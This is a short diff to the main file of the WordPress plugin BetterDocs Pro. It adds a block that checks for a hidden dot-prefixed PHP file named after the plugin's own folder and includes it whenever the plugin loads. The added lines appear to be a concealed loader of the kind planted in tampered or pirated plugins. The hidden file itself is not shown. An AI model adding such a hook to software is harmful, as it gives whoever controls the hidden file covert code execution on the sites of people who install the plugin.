@@ -52,6 +52,10 @@ define( 'BETTERDOCS_FREE_PLUGIN', BETTERDOCS_PRO_ADMIN_DIR_PATH . 'library/bette
  * The code that runs during plugin activation.
  * This action is documented in includes/class-betterdocs-pro-activator.php
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function activate_betterdocs_pro() {
 	require_once plugin_dir_path( __FILE__ ) . 'includes/class-betterdocs-pro-activator.php';
 	Betterdocs_Pro_Activator::activate();
